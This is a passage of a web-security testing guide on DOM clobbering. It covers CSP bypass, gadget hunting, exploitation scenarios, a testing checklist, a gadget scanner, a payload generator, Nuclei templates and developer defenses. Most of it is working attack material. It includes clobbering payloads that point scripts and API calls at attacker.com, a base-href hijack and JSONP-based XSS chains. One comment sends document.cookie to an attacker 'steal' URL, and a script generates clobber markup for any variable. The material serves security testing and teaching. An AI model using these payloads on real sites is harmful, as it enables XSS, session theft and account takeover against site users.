  │                 │ Clobber to bypass sanitization               │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ headroom.js     │ window.Headroom                              │
  │                 │ Plugin initialization override               │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ Leaflet.js      │ window.L                                     │
  │                 │ Override map library namespace               │
  └─────────────────┴─────────────────────────────────────────────┘
  
  # Finding new gadgets:
  # 1. Search JavaScript for: window.SOMETHING || "default"
  # 2. Search for: typeof SOMETHING !== "undefined"
  # 3. Search for: if (window.SOMETHING)
  # 4. Search for: document.createElement("script").src = SOMETHING
  # 5. Search for: fetch(SOMETHING) or $.get(SOMETHING)
  ```
  :::
::

---

## CSP Bypass via DOM Clobbering

::note
DOM Clobbering is one of the **very few techniques** that can bypass **strict Content Security Policies**. Because no JavaScript is injected — only HTML elements — CSP's `script-src` directive is completely irrelevant.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Bypass Strategy"}
  ```txt [Attack Flow]
  ═══════════════════════════════════════════════════
    CSP BYPASS VIA DOM CLOBBERING
  ═══════════════════════════════════════════════════

  TARGET CSP:
    Content-Security-Policy:
      script-src 'self' https://cdn.trusted.com;
      default-src 'self';
      style-src 'self' 'unsafe-inline';

  TRADITIONAL XSS: BLOCKED
    <script>alert(1)</script>           → Blocked by script-src
    <img src=x onerror=alert(1)>        → Blocked by script-src
    <svg onload=alert(1)>               → Blocked by script-src
    javascript:alert(1)                 → Blocked by script-src

  DOM CLOBBERING: ALLOWED!
    <a id="x" href="https://attacker.com">  → Just an HTML element!
    No script execution → CSP doesn't block it

  BUT: How to get code execution?

  CHAIN:
  1. Find JavaScript gadget in 'self' or cdn.trusted.com
     that reads a clobberable global variable
  2. Clobber the variable to point to attacker URL
  3. Gadget loads script from clobbered URL

  EXAMPLE:
    Application JS (from 'self'):
      var analyticsUrl = window.GA_URL || "https://cdn.trusted.com/ga.js";
      var s = document.createElement("script");
      s.src = analyticsUrl;
      document.head.appendChild(s);

    If cdn.trusted.com hosts any file upload or JSONP endpoint:
      Clobber: <a id="GA_URL" href="https://cdn.trusted.com/jsonp?callback=alert">
      CSP allows scripts from cdn.trusted.com ✓
      Script executes alert() via JSONP callback!

  RESULT: XSS achieved DESPITE strict CSP!
  ═══════════════════════════════════════════════════
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="CSP + Clobber Payloads"}
  ```html [Payloads]
  <!-- Scenario: CSP allows scripts from 'self' only -->
  <!-- Find JSONP or controllable JS endpoint on same origin -->

  <!-- If target has JSONP: /api/jsonp?callback=FUNCTION_NAME -->
  <a id="scriptSource" href="/api/jsonp?callback=alert">
  <!-- When gadget does: script.src = window.scriptSource -->
  <!-- Loads: /api/jsonp?callback=alert → executes alert() -->
  <!-- Same-origin → CSP allows it! -->

  <!-- If target has file upload that serves JS: -->
  <a id="modulePath" href="/uploads/evil.js">
  <!-- Upload a JS file → clobber path → load via gadget -->

  <!-- If target has Angular/JSONP endpoint: -->
  <a id="templateUrl" href="/api/template?q={{constructor.constructor('alert(1)')()}}">

  <!-- If CSP allows specific CDN: -->
  <!-- Find any XSS-triggering file on that CDN -->
  <a id="libUrl" href="https://allowed-cdn.com/vuln-library.js">

  <!-- Leverage base-uri for relative URL clobbering: -->
  <!-- If no base-uri in CSP: -->
  <base href="https://attacker.com/">
  <!-- Now ALL relative script/resource URLs load from attacker -->
  <!-- Combined with clobbering for double effect -->
  ```
  :::
::

---

## Finding Clobberable Variables

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Manual JavaScript Analysis"}
  ```bash [Terminal]
  # Download and search target's JavaScript for clobberable patterns

  # Get all JS files
  echo "https://target.com" | gau | grep "\.js$" | sort -u > js_files.txt

  # Download all JS files
  mkdir -p js_sources
  while read url; do
    filename=$(echo "$url" | md5sum | cut -c1-12)
    curl -s "$url" -o "js_sources/$filename.js"
  done < js_files.txt

  # Search for vulnerable patterns:

  # Pattern: window.X || default
  grep -rn "window\.\w\+ ||" js_sources/ | head -50

  # Pattern: typeof X !== "undefined"
  grep -rn 'typeof \w\+ !== .undefined.' js_sources/ | head -50

  # Pattern: if (window.X)
  grep -rn 'if\s*(window\.\w\+)' js_sources/ | head -50

  # Pattern: document.createElement("script").src
  grep -rn 'createElement.*script.*\.src' js_sources/ | head -50

  # Pattern: global variable assignments
  grep -rn 'var \w\+ = \w\+ ||' js_sources/ | head -50

  # Pattern: global config objects
  grep -rn 'window\.\(config\|settings\|options\|defaults\|CONFIG\|SETTINGS\)' js_sources/ | head -50

  # Pattern: fetch/XHR with global URL
  grep -rn 'fetch(window\.\|\.get(window\.\|\.post(window\.' js_sources/ | head -50

  # Pattern: Dynamic import
  grep -rn 'import(window\.\|import(\w\+\.\)' js_sources/ | head -50
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Browser Console Testing"}
  ```javascript [Console Commands]
  // Run in browser console on target page to find clobberable globals

  // List all window properties that are undefined (clobberable):
  const allProps = Object.getOwnPropertyNames(window);
  const undefinedProps = allProps.filter(p => {
    try { return window[p] === undefined; } catch(e) { return false; }
  });
  console.log("Undefined window properties:", undefinedProps.length);

  // Search loaded scripts for clobberable patterns:
  document.querySelectorAll("script[src]").forEach(s => {
    fetch(s.src).then(r => r.text()).then(code => {
      // Find window.X || "default" patterns
      const matches = code.match(/window\.(\w+)\s*\|\|/g);
      if (matches) {
        console.log(`${s.src}:`);
        matches.forEach(m => console.log(`  ${m}`));
      }
    });
  });

  // Check inline scripts:
  document.querySelectorAll("script:not([src])").forEach(s => {
    const matches = s.textContent.match(/window\.(\w+)\s*(\|\||&&|\?\.|\?\?)/g);
    if (matches) {
      console.log("Inline script clobberable vars:");
      matches.forEach(m => console.log(`  ${m}`));
    }
  });

  // Test if a specific variable is clobberable:
  function testClobber(varName) {
    if (window[varName] === undefined) {
      console.log(`✓ window.${varName} is UNDEFINED → clobberable`);
    } else {
      console.log(`✗ window.${varName} already defined:`, typeof window[varName]);
    }
  }

  // Test common targets:
  ["config", "settings", "options", "data", "api", "BASE_URL",
   "API_URL", "CDN_URL", "ANALYTICS_URL", "DEBUG", "ENV",
   "ga", "gtag", "dataLayer", "fbq", "Intercom",
   "GLOBAL_CONFIG", "APP_CONFIG", "initConfig"].forEach(testClobber);
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Automated Tools"}
  ```bash [Terminal]
  # DOM Clobbering specific tools:

  # 1. dom-clobbering-scanner (custom grep patterns)
  # Search through JS for patterns:
  find . -name "*.js" -exec grep -l "window\.\w\+ ||" {} \;
  find . -name "*.js" -exec grep -l "typeof \w\+ !=" {} \;

  # 2. Semgrep rules for DOM Clobbering
  # Create custom semgrep rule:
  cat > clobber.yaml << 'EOF'
  rules:
    - id: dom-clobbering-sink
      patterns:
        - pattern: |
            var $X = window.$Y || $DEFAULT;
        - metavariable-regex:
            metavariable: $Y
            regex: ^[A-Z_][A-Z0-9_]*$
      message: "Potential DOM Clobbering: window.$Y"
      severity: WARNING
      languages: [javascript, typescript]

    - id: dom-clobbering-script-src
      pattern: |
        $EL.src = window.$X;
      message: "Script src from window property - DOM Clobbering sink"
      severity: ERROR
      languages: [javascript, typescript]

    - id: dom-clobbering-fetch
      pattern: |
        fetch(window.$X)
      message: "Fetch from window property - DOM Clobbering sink"
      severity: ERROR
      languages: [javascript, typescript]
  EOF

  semgrep --config clobber.yaml js_sources/

  # 3. RetireJS for known vulnerable libraries:
  retire --jspath js_sources/

  # 4. nuclei templates for DOM issues:
  echo "https://target.com" | nuclei -tags dom
  ```
  :::
::

---

## Exploitation Scenarios

### Scenario 1: Script Injection via Clobbered URL

::steps{level="4"}

#### Identify the Gadget

```javascript [Vulnerable Code]
// Found in target's main.js:
(function() {
  var cdnBase = window.CDN_BASE || "https://cdn.target.com";
  var script = document.createElement("script");
  script.src = cdnBase + "/analytics.js";
  document.head.appendChild(script);
})();
```

#### Verify Clobberability

```javascript [Browser Console]
// Check if CDN_BASE is undefined (not set elsewhere):
console.log(window.CDN_BASE);  // → undefined ✓ (clobberable!)
```

#### Craft the Payload

```html [Payload]
<!-- Inject this HTML (via stored XSS, HTML injection, etc.) -->
<a id="CDN_BASE" href="https://attacker.com">

<!-- Application loads: https://attacker.com/analytics.js -->
<!-- Attacker's analytics.js contains: -->
<!-- document.location = "https://attacker.com/steal?cookie=" + document.cookie -->
```

#### Confirm Execution

```txt [Result]
1. Page loads → JavaScript executes
2. window.CDN_BASE is now the <a> element
3. cdnBase = <a> element (truthy, not "undefined")
4. script.src = <a>.toString() + "/analytics.js"
5. script.src = "https://attacker.com/analytics.js"
6. Browser loads and executes attacker's script
7. Full XSS achieved → cookie theft, keylogging, etc.
```

::

### Scenario 2: Account Takeover via API Redirect

```txt [Attack Flow]
VULNERABLE CODE:
  const api = window.API_ENDPOINT || "https://api.target.com";
  fetch(api + "/user/profile", { credentials: "include" })
    .then(r => r.json())
    .then(profile => renderProfile(profile));

CLOBBER PAYLOAD:
  <a id="API_ENDPOINT" href="https://attacker.com">

ATTACK CHAIN:
  1. User visits page with clobbered HTML
  2. JavaScript fetches https://attacker.com/user/profile
     WITH credentials (cookies) included!
  3. Attacker's server receives victim's cookies
  4. Attacker's server responds with fake profile data
  5. OR: Attacker sets up CORS on their server to accept credentials
     and logs the authentication cookies

IMPACT: Session hijacking → Account Takeover
```

### Scenario 3: CSP Bypass via JSONP Gadget

```txt [Attack Flow]
TARGET CSP:
  script-src 'self' https://apis.google.com;

VULNERABLE CODE (on target):
  var callback = window.JSONP_CALLBACK || "handleData";
  var s = document.createElement("script");
  s.src = "https://apis.google.com/custom?callback=" + callback;
  document.head.appendChild(s);

CLOBBER PAYLOAD:
  <a id="JSONP_CALLBACK" href="alert(document.domain)//">

RESULT:
  s.src = "https://apis.google.com/custom?callback=alert(document.domain)//"
  CSP allows apis.google.com ✓
  JSONP response: alert(document.domain)//({"data": ...})
  JavaScript executes: alert(document.domain) → XSS!

IMPACT: CSP bypass → Full XSS despite strict policy
```

---

## Privilege Escalation

::card-group
  ::card
  ---
  title: DOM Clobbering → Script Load → Full XSS
  icon: i-lucide-code
  ---
  Clobber URL variable → Gadget loads attacker's script → **Arbitrary JavaScript execution** bypassing CSP, sanitizers, and WAFs. **Severity: Critical**.
  ::

  ::card
  ---
  title: API Redirect → Data Theft → Session Hijack
  icon: i-lucide-database
  ---
  Clobber API base URL → Application sends authenticated requests to attacker → **Credentials and sensitive data stolen**. **Severity: High-Critical**.
  ::

  ::card
  ---
  title: Sanitizer Bypass → Stored XSS → Mass Exploitation
  icon: i-lucide-shield-off
  ---
  Clobber sanitizer internals → Malicious HTML passes through → **Stored XSS** affecting every user who views the content. **Severity: Critical**.
  ::

  ::card
  ---
  title: CSP Bypass → XSS on Hardened Target
  icon: i-lucide-lock-open
  ---
  No script injection needed → Clobber + JSONP/same-origin gadget → **XSS on targets with strictest CSP**. **Severity: High-Critical**.
  ::

  ::card
  ---
  title: Config Clobbering → Feature Hijack → Phishing
  icon: i-lucide-settings
  ---
  Clobber application configuration → Change logos, redirect URLs, feature flags → **Convincing phishing** under legitimate domain. **Severity: Medium-High**.
  ::

  ::card
  ---
  title: postMessage Origin Override → Cross-Origin Data Leak
  icon: i-lucide-send
  ---
  Clobber postMessage target origin → Sensitive data sent to **attacker-controlled window** → Cross-origin information disclosure. **Severity: High**.
  ::
::

---

## Testing Methodology

::steps{level="3"}

### Identify HTML Injection Points

```txt [Where to Look]
1. User-generated content (comments, posts, profiles, bios)
2. HTML email rendering (webmail, notification previews)
3. Markdown/rich text editors that allow HTML
4. URL parameters reflected in HTML (after sanitization)
5. SVG file uploads rendered in page
6. Template injection points
7. CMS content blocks
8. Widget/embed systems
9. Error messages with HTML
10. WYSIWYG editors

KEY REQUIREMENT:
  You need the ability to inject HTML elements (with id/name attributes)
  into a page that also runs vulnerable JavaScript.
  The HTML does NOT need to contain any JavaScript.
```

### Analyze JavaScript for Gadgets

```txt [Gadget Hunting Checklist]
Search for these patterns in all JavaScript loaded on the target page:

HIGH VALUE (leads to script execution):
  □ script.src = window.X
  □ import(window.X)
  □ fetch(window.X) / $.get(window.X)
  □ eval(window.X)
  □ document.write(window.X)
  □ element.innerHTML = window.X
  □ new Function(window.X)
  □ setTimeout(window.X)
  □ setInterval(window.X)

MEDIUM VALUE (data theft, redirect):
  □ window.location = window.X
  □ window.open(window.X)
  □ $.ajax({url: window.X})
  □ postMessage(data, window.X)
  □ element.src = window.X
  □ element.href = window.X

LOW VALUE (logic manipulation):
  □ if (window.X) { ... }
  □ typeof window.X
  □ window.X.property
  □ for (key in window.X)
```

### Craft and Test Payloads

```txt [Testing Process]
1. Identify variable name from gadget (e.g., window.CDN_BASE)
2. Verify it's undefined on the target page
3. Inject: <a id="CDN_BASE" href="https://COLLABORATOR_URL">
4. Reload page
5. Check if Burp Collaborator receives requests
6. If yes → clobbering works AND reaches dangerous sink
7. Escalate: Replace collaborator with actual exploit URL
8. For nested: Test <a id="x"></a><a id="x" name="y" href="...">
```

### Verify Impact

```txt [Impact Verification]
□ Can you load external JavaScript? (script.src sink)
□ Can you redirect API calls? (fetch/XHR sink)
□ Can you modify page content? (innerHTML sink)
□ Can you redirect the user? (location sink)
□ Does it bypass CSP?
□ Does it bypass the HTML sanitizer?
□ Is the injection stored (affects all users)?
□ What's the highest privilege user affected?
```

::

---

## Testing Checklist

::collapsible

```txt [DOM Clobbering Testing Checklist]
═══════════════════════════════════════════════════════
  DOM CLOBBERING TESTING CHECKLIST
═══════════════════════════════════════════════════════

[ ] RECONNAISSANCE
    [ ] Identify all HTML injection points
    [ ] Map which pages allow user HTML content
    [ ] Identify HTML sanitizer used (DOMPurify version?)
    [ ] Check Content Security Policy headers
    [ ] Download and analyze all JavaScript files
    [ ] List all global variables referenced in JS
    [ ] Check for typeof/undefined checks on globals
    [ ] Identify library versions (webpack, analytics, etc.)

[ ] BASIC CLOBBERING
    [ ] Test id attribute clobbering: <img id="x">
    [ ] Test name attribute clobbering: <form name="x">
    [ ] Verify window.x returns injected element
    [ ] Test <a id="x" href="https://attacker.com"> for string control
    [ ] Test <area id="x" href="https://attacker.com">
    [ ] Test multiple elements with same id (HTMLCollection)
    [ ] Test document-level named access

[ ] NESTED CLOBBERING
    [ ] form + input: <form id="x"><input name="y">
    [ ] form + output: <form id="x"><output name="y">
    [ ] Dual anchors: <a id="x"></a><a id="x" name="y" href="...">
    [ ] iframe + srcdoc: <iframe name="x" srcdoc="<a id='y'...>">
    [ ] Three-level: form + HTMLCollection inside form
    [ ] Verify window.x.y returns expected value
    [ ] Test string coercion of nested properties

[ ] SANITIZER BYPASS
    [ ] Clobber element.attributes
    [ ] Clobber element.children / childNodes
    [ ] Clobber element.nodeName / tagName
    [ ] Clobber element.hasAttribute / getAttribute
    [ ] Clobber element.parentNode
    [ ] Clobber element.innerHTML / textContent
    [ ] Test mutation XSS + clobbering combination
    [ ] Test namespace confusion (SVG/MathML)
    [ ] Check DOMPurify version for known bypasses

[ ] GADGET HUNTING
    [ ] window.X || "default" patterns
    [ ] typeof X !== "undefined" patterns
    [ ] if (window.X) conditional patterns
    [ ] script.src = window.X (script loading sinks)
    [ ] fetch(window.X) / $.get() (network sinks)
    [ ] import(window.X) (dynamic import sinks)
    [ ] element.innerHTML = window.X (HTML sinks)
    [ ] window.location = window.X (navigation sinks)
    [ ] eval() / Function() / setTimeout() (code execution sinks)
    [ ] postMessage(data, window.X) (cross-origin sinks)
    [ ] __webpack_public_path__ (module loader override)
    [ ] Library-specific configuration objects

[ ] CSP BYPASS
    [ ] Does target have CSP?
    [ ] Can clobbering achieve XSS without script injection?
    [ ] Are there JSONP endpoints on whitelisted domains?
    [ ] Are there file upload endpoints on same origin?
    [ ] Can base URI be clobbered (<base href>)?
    [ ] Chain: clobber URL + load from allowed source

[ ] EXPLOITATION
    [ ] Craft HTML-only payload (no JS needed)
    [ ] Test payload passes through sanitizer
    [ ] Verify JavaScript gadget triggers
    [ ] Confirm external resource loads
    [ ] Demonstrate code execution or data theft
    [ ] Test stored vs reflected impact
    [ ] Document full attack chain

[ ] IMPACT ASSESSMENT
    [ ] Script execution achieved?
    [ ] Session hijacking possible?
    [ ] API data theft possible?
    [ ] Phishing/redirect possible?
    [ ] CSP bypass achieved?
    [ ] Sanitizer bypass achieved?
    [ ] Stored XSS (mass impact)?
    [ ] Admin/privileged user affected?

═══════════════════════════════════════════════════════
```

::

---

## Automation & Detection Scripts

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Gadget Scanner"}
  ::code-collapse
  ```python [clobber_scanner.py]
  #!/usr/bin/env python3
  """
  DOM Clobbering Gadget Scanner
  Analyzes JavaScript files for clobberable patterns
  """
  import re
  import sys
  import requests
  from urllib.parse import urlparse
  from collections import defaultdict

  class ClobberScanner:
      
      PATTERNS = {
          "window_or_default": {
              "regex": r'window\.(\w+)\s*\|\|\s*["\']',
              "severity": "HIGH",
              "desc": "Global variable with fallback default"
          },
          "typeof_check": {
              "regex": r'typeof\s+(?:window\.)?(\w+)\s*!==?\s*["\']undefined["\']',
              "severity": "MEDIUM",
              "desc": "typeof undefined check on global"
          },
          "truthiness_check": {
              "regex": r'if\s*\(\s*window\.(\w+)\s*\)',
              "severity": "MEDIUM",
              "desc": "Truthiness check on window property"
          },
          "script_src_global": {
              "regex": r'\.src\s*=\s*(?:window\.)?(\w+)',
              "severity": "CRITICAL",
              "desc": "Script/image src from global variable"
          },
          "fetch_global": {
              "regex": r'fetch\(\s*(?:window\.)?(\w+)',
              "severity": "HIGH",
              "desc": "Fetch URL from global variable"
          },
          "eval_global": {
              "regex": r'eval\(\s*(?:window\.)?(\w+)',
              "severity": "CRITICAL",
              "desc": "Eval with global variable"
          },
          "innerhtml_global": {
              "regex": r'innerHTML\s*=\s*(?:window\.)?(\w+)',
              "severity": "HIGH",
              "desc": "innerHTML from global variable"
          },
          "location_global": {
              "regex": r'(?:window\.)?location\s*=\s*(?:window\.)?(\w+)',
              "severity": "HIGH",
              "desc": "Location redirect from global variable"
          },
          "nullish_coalesce": {
              "regex": r'window\.(\w+)\s*\?\?\s*["\']',
              "severity": "HIGH",
              "desc": "Nullish coalescing on global"
          },
          "optional_chain": {
              "regex": r'window\.(\w+)\?\.\w+',
              "severity": "MEDIUM",
              "desc": "Optional chaining on global"
          },
          "webpack_public": {
              "regex": r'__webpack_public_path__\s*=\s*(?:window\.)?(\w+)',
              "severity": "CRITICAL",
              "desc": "Webpack public path from global"
          },
          "dynamic_import": {
              "regex": r'import\(\s*(?:window\.)?(\w+)',
              "severity": "CRITICAL",
              "desc": "Dynamic import from global variable"
          },
          "postmessage_origin": {
              "regex": r'postMessage\([^,]+,\s*(?:window\.)?(\w+)',
              "severity": "HIGH",
              "desc": "postMessage target origin from global"
          },
      }
      
      # Variables that can't be clobbered (protected by browsers)
      PROTECTED = {
          "location", "document", "window", "self", "top", "parent",
          "frames", "navigator", "screen", "history", "localStorage",
          "sessionStorage", "console", "alert", "confirm", "prompt",
          "setTimeout", "setInterval", "fetch", "XMLHttpRequest",
          "Math", "JSON", "Date", "Array", "Object", "String",
          "Number", "Boolean", "RegExp", "Error", "Promise",
          "undefined", "null", "NaN", "Infinity", "this",
      }
      
      def __init__(self):
          self.findings = defaultdict(list)
      
      def scan_code(self, code, source="unknown"):
          for pattern_name, pattern_info in self.PATTERNS.items():
              matches = re.finditer(pattern_info["regex"], code)
              for match in matches:
                  var_name = match.group(1)
                  
                  if var_name.lower() in {p.lower() for p in self.PROTECTED}:
                      continue
                  
                  line_num = code[:match.start()].count('\n') + 1
                  context = code[max(0, match.start()-30):match.end()+30].strip()
                  
                  finding = {
                      "variable": var_name,
                      "pattern": pattern_name,
                      "severity": pattern_info["severity"],
                      "description": pattern_info["desc"],
                      "source": source,
                      "line": line_num,
                      "context": context[:100],
                  }
                  self.findings[pattern_info["severity"]].append(finding)
      
      def scan_url(self, url):
          try:
              resp = requests.get(url, timeout=15)
              if resp.status_code == 200:
                  self.scan_code(resp.text, url)
          except Exception as e:
              print(f"[-] Error fetching {url}: {e}")
      
      def scan_file(self, filepath):
          try:
              with open(filepath) as f:
                  self.scan_code(f.read(), filepath)
          except Exception as e:
              print(f"[-] Error reading {filepath}: {e}")
      
      def generate_payloads(self):
          """Generate clobbering payloads for found variables"""
          payloads = []
          all_findings = []
          for severity_findings in self.findings.values():
              all_findings.extend(severity_findings)
          
          seen = set()
          for f in all_findings:
              var = f["variable"]
              if var in seen:
                  continue
              seen.add(var)
              
              payloads.append(f'<!-- Clobber window.{var} -->')
              payloads.append(f'<a id="{var}" href="https://ATTACKER.com/{var}">')
              payloads.append("")
          
          return "\n".join(payloads)
      
      def report(self):
          print(f"\n{'='*60}")
          print(f"  DOM CLOBBERING GADGET SCAN RESULTS")
          print(f"{'='*60}")
          
          total = sum(len(v) for v in self.findings.values())
          print(f"\n  Total findings: {total}")
          
          for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
              findings = self.findings.get(severity, [])
              if findings:
                  print(f"\n  [{severity}] ({len(findings)} findings)")
                  for f in findings:
                      print(f"    window.{f['variable']}")
                      print(f"      Pattern: {f['description']}")
                      print(f"      Source: {f['source']}:{f['line']}")
                      print(f"      Context: {f['context']}")
                      print()
          
          if total > 0:
              print(f"\n{'='*60}")
              print(f"  SUGGESTED PAYLOADS")
              print(f"{'='*60}")
              print(self.generate_payloads())
          
          print(f"{'='*60}")

  if __name__ == "__main__":
      scanner = ClobberScanner()
      
      if len(sys.argv) < 2:
          print(f"Usage: {sys.argv[0]} <url_or_file> [url_or_file ...]")
          sys.exit(1)
      
      for target in sys.argv[1:]:
          if target.startswith("http"):
              print(f"[*] Scanning URL: {target}")
              scanner.scan_url(target)
          else:
              print(f"[*] Scanning file: {target}")
              scanner.scan_file(target)
      
      scanner.report()
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Payload Generator"}
  ```python [generate_clobber.py]
  #!/usr/bin/env python3
  """
  DOM Clobbering Payload Generator
  Generates payloads for specific variable names and depths
  """
  import sys

  def single_clobber(var_name, url="https://ATTACKER.com"):
      """Generate single-level clobber: window.x"""
      return f'<a id="{var_name}" href="{url}">'

  def nested_clobber_form(parent, child, value="attacker_value"):
      """Generate nested clobber via form: window.x.y"""
      return f'''<form id="{parent}">
    <output name="{child}">{value}</output>
  </form>'''

  def nested_clobber_anchor(parent, child, url="https://ATTACKER.com"):
      """Generate nested clobber via dual anchors: window.x.y (string)"""
      return f'<a id="{parent}"></a>\n<a id="{parent}" name="{child}" href="{url}">'

  def nested_clobber_iframe(parent, child, url="https://ATTACKER.com"):
      """Generate nested clobber via iframe: window.x.y"""
      return f'''<iframe name="{parent}" srcdoc="<a id='{child}' href='{url}'>"></iframe>'''

  def triple_clobber(a, b, c, url="https://ATTACKER.com"):
      """Generate 3-level clobber: window.x.y.z"""
      return f'''<form id="{a}">
    <a name="{b}"></a>
    <a name="{b}" id="{c}" href="{url}">
  </form>'''

  def main():
      var = sys.argv[1] if len(sys.argv) > 1 else "config"
      url = sys.argv[2] if len(sys.argv) > 2 else "https://ATTACKER.com"
      
      parts = var.split(".")
      
      print(f"# DOM Clobbering payloads for: window.{var}")
      print(f"# Target URL: {url}")
      print()
      
      if len(parts) == 1:
          print("# === Single Level ===")
          print(single_clobber(parts[0], url))
          print()
      
      elif len(parts) == 2:
          print("# === Dual Anchor Method (controllable string) ===")
          print(nested_clobber_anchor(parts[0], parts[1], url))
          print()
          print("# === Form + Input Method (controllable value) ===")
          print(nested_clobber_form(parts[0], parts[1], url))
          print()
          print("# === Iframe Method ===")
          print(nested_clobber_iframe(parts[0], parts[1], url))
          print()
      
      elif len(parts) == 3:
          print("# === Triple Level ===")
          print(triple_clobber(parts[0], parts[1], parts[2], url))
          print()

  if __name__ == "__main__":
      main()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nuclei Template"}
  ::code-collapse
  ```yaml [dom-clobbering-detect.yaml]
  id: dom-clobbering-gadget-detection

  info:
    name: DOM Clobbering Gadget Detection
    author: security-researcher
    severity: medium
    description: Detects JavaScript patterns vulnerable to DOM Clobbering
    tags: dom,clobbering,xss,csp-bypass

  http:
    - method: GET
      path:
        - "{{BaseURL}}"

      extractors:
        - type: regex
          name: clobberable-globals
          group: 1
          regex:
            - 'window\.([A-Z_][A-Z0-9_]+)\s*\|\|'
            - 'window\.([a-zA-Z_]\w+)\s*\?\?'
            - 'typeof\s+window\.([a-zA-Z_]\w+)\s*!=='
            - '\.src\s*=\s*window\.([a-zA-Z_]\w+)'

  ---

  id: dom-clobbering-csp-check

  info:
    name: CSP + DOM Clobbering Opportunity
    author: security-researcher
    severity: info
    description: Strict CSP detected - DOM Clobbering may be viable bypass
    tags: dom,clobbering,csp

  http:
    - method: GET
      path:
        - "{{BaseURL}}"

      matchers-condition: and
      matchers:
        - type: word
          part: header
          words:
            - "content-security-policy"
        - type: word
          part: header
          words:
            - "script-src"

      extractors:
        - type: kval
          kval:
            - content_security_policy
  ```
  ::
  :::
::

---

## Prevention & Mitigation

::collapsible

```txt [Defense Recommendations]
FOR DEVELOPERS:
═══════════════

1. AVOID GLOBAL VARIABLE CHECKS
   BAD:  let url = window.CONFIG_URL || "/default";
   GOOD: const CONFIG = Object.freeze({ url: "/default" });

2. USE STRICT PROPERTY ACCESS
   BAD:  if (window.myVar) { ... }
   GOOD: if (Object.hasOwn(window, 'myVar') && 
             window.myVar instanceof ExpectedType) { ... }

3. FREEZE CONFIGURATION OBJECTS
   const config = Object.freeze({
     apiUrl: "https://api.example.com",
     cdnUrl: "https://cdn.example.com"
   });

4. VALIDATE TYPES BEFORE USE
   if (typeof window.x === 'string') {
     // Safe - DOM elements are 'object', not 'string'
     useValue(window.x);
   }

5. USE OBJECT.PROTOTYPE CHECKS
   if (window.x && !(window.x instanceof HTMLElement)) {
     // Not a clobbered DOM element
     useValue(window.x);
   }

6. SET VARIABLES BEFORE ANY HTML PARSING
   <script>
     window.CONFIG = { url: "/api" };  // Set BEFORE any HTML injection point
   </script>

7. USE HTML SANITIZER WITH CLOBBERING PROTECTION
   DOMPurify (latest version) with:
     DOMPurify.sanitize(html, {
       SANITIZE_NAMED_PROPS: true,  // Remove id/name that could clobber
     });

8. CONFIGURE CSP WITH STRICT DYNAMIC
   Content-Security-Policy: script-src 'strict-dynamic' 'nonce-RANDOM';
```

::

---

## References & Resources

::card-group
  ::card
  ---
  title: PortSwigger - DOM Clobbering
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/dom-based/dom-clobbering
  target: _blank
  ---
  Interactive labs and comprehensive guide on DOM Clobbering including basic exploitation, sanitizer bypass, and CSP bypass techniques.
  ::

  ::card
  ---
  title: HackTricks - DOM Clobbering
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html
  target: _blank
  ---
  Detailed DOM Clobbering attack guide with nested clobbering payloads, DOMPurify bypass techniques, and real-world exploitation examples.
  ::

  ::card
  ---
  title: HTML Spec - Named Access on Window
  icon: i-lucide-file-text
  to: https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object
  target: _blank
  ---
  The official HTML specification defining named property access behavior that makes DOM Clobbering possible. Understanding the spec is essential.
  ::

  ::card
  ---
  title: DOM Clobbering Research Paper
  icon: i-lucide-flask-conical
  to: https://publications.cispa.saarland/3756/
  target: _blank
  ---
  Academic research paper "It's (DOM) Clobbering Time" — comprehensive study of DOM Clobbering prevalence, automated detection, and exploitation across the web.
  ::

  ::card
  ---
  title: DOMPurify
  icon: i-simple-icons-github
  to: https://github.com/cure53/DOMPurify
  target: _blank
  ---
  The most widely used HTML sanitizer. Check changelog for DOM Clobbering-related fixes and understand which versions are vulnerable.
  ::

  ::card
  ---
  title: DOM Clobbering Payload Collection
  icon: i-simple-icons-github
  to: https://github.com/nicedayzhu/dom-clobbering
  target: _blank
  ---
  Community-maintained collection of DOM Clobbering payloads, gadgets, and bypass techniques for various sanitizers and frameworks.
  ::

  ::card
  ---
  title: PayloadsAllTheThings - DOM Clobbering
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-clobbering
  target: _blank
  ---
  Curated DOM Clobbering payloads within the broader XSS injection section of PayloadsAllTheThings repository.
  ::

  ::card
  ---
  title: Cure53 Research on DOM Clobbering
  icon: i-lucide-flask-conical
  to: https://cure53.de/
  target: _blank
  ---
  Security research from Cure53 (DOMPurify authors) on DOM Clobbering attacks, mutation XSS, and sanitizer bypass techniques.
  ::

  ::card
  ---
  title: Google Security Blog - DOM Clobbering
  icon: i-lucide-shield-check
  to: https://security.googleblog.com/
  target: _blank
  ---
  Google's security blog featuring research on DOM-based attacks, Trusted Types, and defense mechanisms against DOM Clobbering.
  ::

  ::card
  ---
  title: MDN - Named Access on Window
  icon: i-lucide-book-open
  to: https://developer.mozilla.org/en-US/docs/Web/API/Window#named_access_on_the_window_object
  target: _blank
  ---
  Mozilla Developer Network documentation on the Window object's named access property that enables DOM Clobbering in all browsers.
  ::

  ::card
  ---
  title: PortSwigger Research - Mutation XSS
  icon: i-lucide-flask-conical
  to: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
  target: _blank
  ---
  Research on combining mutation XSS with DOM Clobbering to bypass DOMPurify and other HTML sanitizers.
  ::

  ::card
  ---
  title: Semgrep DOM Clobbering Rules
  icon: i-lucide-search
  to: https://semgrep.dev/r?q=dom+clobbering
  target: _blank
  ---
  Community-contributed Semgrep rules for automatically detecting DOM Clobbering-vulnerable JavaScript patterns in source code.
  ::
::